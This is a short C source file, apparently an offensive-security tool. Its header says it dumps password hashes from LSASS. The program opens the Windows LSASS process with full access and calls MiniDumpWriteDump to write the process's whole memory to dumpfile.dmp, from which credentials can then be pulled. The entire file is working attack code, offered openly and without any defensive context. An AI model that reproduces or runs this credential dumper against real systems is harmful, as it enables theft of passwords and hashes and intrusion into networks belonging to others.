/*
* Author: Aleksa Zatezalo
* Date: Februrary 2024
* Description: LSASS is a C program that dumps password hashes from LSASSs. 
*/

/* gcc lsass_dump.c -o lsass_dump.exe -lDbghelp */

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <DbgHelp.h>

void LSASSDump()
{
    HANDLE lsassProcess;
    int lsassPID = 0; // Set the correct LSASS PID
    HANDLE DumpFile = CreateFileA("dumpfile.dmp", GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (DumpFile == INVALID_HANDLE_VALUE) {
        printf("[!] Error creating dump file! %d\n", GetLastError());
        exit(1);
    }
    printf("[+] Dump file created successfully!\n");

    lsassProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, lsassPID);
    if (lsassProcess == NULL) {
        printf("[!] Could not open LSASS Process! %d\n", GetLastError());
        exit(1);
    }
    printf("[+] Got a handle to the LSASS Process!\n");

    int ProcDump = MiniDumpWriteDump(lsassProcess, lsassPID, DumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (!ProcDump) {
        printf("[!] Error while calling MiniDumpWriteDump() %d\n", GetLastError());
        exit(1);
    }
    printf("[+] Successfully conducted memory dump!\n");
}

int main()
{
    LSASSDump();
    return 0;
}